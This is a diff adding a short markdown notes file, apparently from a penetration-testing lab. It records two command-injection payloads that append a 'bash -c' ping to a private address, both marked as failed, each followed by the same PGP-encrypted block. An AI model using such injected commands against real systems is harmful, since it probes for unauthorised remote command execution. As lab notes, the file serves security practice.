@@ -1,0 +1,63 @@
+#  CMD-by-CMDs
+
+```bash
+sed -i 's///g' *-CMD-by-CMDs.md
+```
+
+```
+
+```
+## Failed 
+
+Payload
+```bash
+;bash -c 'ping -c 3 10.10.14.106'
+```
+
+```
+-----BEGIN PGP MESSAGE-----
+
+hQIMA2u3M9ko0UzmAQ/+N3KdfKerhuqL+ylPQiHbdyRX3E3gWZQ5cw3IwClJmDYW
+w/yIan2XBb9kimIK5WW6Tm+U5LmabGeUMi/3W7UZS7uShFhbY+69SCT4gO0Oc/uT
+B9RhEM0OUc1cbtz6JhhFtXD2YHaC1UEzT1Q/jUyU8F1kqtRX5Bke4Ra5cDTSzZl2
+FPieg+qF7cDHnwVEr16P1qDgfKUq9i3FkIdoxeg7AbFOhCuSUpUFPkRm58XeJj0l
+fA5KLgFO3/MAImEQ8kMRwrUod/Qxk0Y3Mu48oXmG4Rn3H9c0KClviMuS8QqQiQxg
+FSOUIh3ToiXpikMXOvA5GOLxi8dt+IK8/wPmvKLyvbddK3E0rEcD17FqywnGDDBc
+V1zNELOXDHOTXej/yVXNEcMqQ5N0We16CwgbdI6ZRdofEga/qv0z6q62IiJkWCxV
+/e5f5o603/xIrvhjxOjAfYrya0DGuFp0bGulDJKTXN5RNfBAoolcWOPfqiq5lZvg
+NNgasRZXzVtOLRMh4lOW5v2P5VwmZ7BajPrygUwhZhpJ98uZMNjiRAzJFqfUlsol
+GJIu+mF+SDtTddjKOqHcO2ZRrjUiamZaiBpVPNcXszhsmb2cO38oMr1SQMa4BzC8
+fEZdX7+z1kNEGOKk73lxYzUO/jpCI6Zc+BF2CWw/HlDFTroLzaPM18nTJzSu8p/S
+VgG1nmJwklrEfB5c+uD0CHNTTWFBo4elFTSaxEMs8kelqqCPSwe5ywP3DHDqTUUG
+XKUmbTxMgq0AOELfPlycZf6bV0EQF4OofVm3982Q8axDPAVeeky4
+=4Y8x
+-----END PGP MESSAGE-----
+```
+
+- Failed
+
+Payload
+```bash
+&& bash -c 'ping -c 3 10.10.14.106'
+```
+
+```
+-----BEGIN PGP MESSAGE-----
+
+hQIMA2u3M9ko0UzmAQ/+N3KdfKerhuqL+ylPQiHbdyRX3E3gWZQ5cw3IwClJmDYW
+w/yIan2XBb9kimIK5WW6Tm+U5LmabGeUMi/3W7UZS7uShFhbY+69SCT4gO0Oc/uT
+B9RhEM0OUc1cbtz6JhhFtXD2YHaC1UEzT1Q/jUyU8F1kqtRX5Bke4Ra5cDTSzZl2
+FPieg+qF7cDHnwVEr16P1qDgfKUq9i3FkIdoxeg7AbFOhCuSUpUFPkRm58XeJj0l
+fA5KLgFO3/MAImEQ8kMRwrUod/Qxk0Y3Mu48oXmG4Rn3H9c0KClviMuS8QqQiQxg
+FSOUIh3ToiXpikMXOvA5GOLxi8dt+IK8/wPmvKLyvbddK3E0rEcD17FqywnGDDBc
+V1zNELOXDHOTXej/yVXNEcMqQ5N0We16CwgbdI6ZRdofEga/qv0z6q62IiJkWCxV
+/e5f5o603/xIrvhjxOjAfYrya0DGuFp0bGulDJKTXN5RNfBAoolcWOPfqiq5lZvg
+NNgasRZXzVtOLRMh4lOW5v2P5VwmZ7BajPrygUwhZhpJ98uZMNjiRAzJFqfUlsol
+GJIu+mF+SDtTddjKOqHcO2ZRrjUiamZaiBpVPNcXszhsmb2cO38oMr1SQMa4BzC8
+fEZdX7+z1kNEGOKk73lxYzUO/jpCI6Zc+BF2CWw/HlDFTroLzaPM18nTJzSu8p/S
+VgG1nmJwklrEfB5c+uD0CHNTTWFBo4elFTSaxEMs8kelqqCPSwe5ywP3DHDqTUUG
+XKUmbTxMgq0AOELfPlycZf6bV0EQF4OofVm3982Q8axDPAVeeky4
+=4Y8x
+-----END PGP MESSAGE-----
+```
+
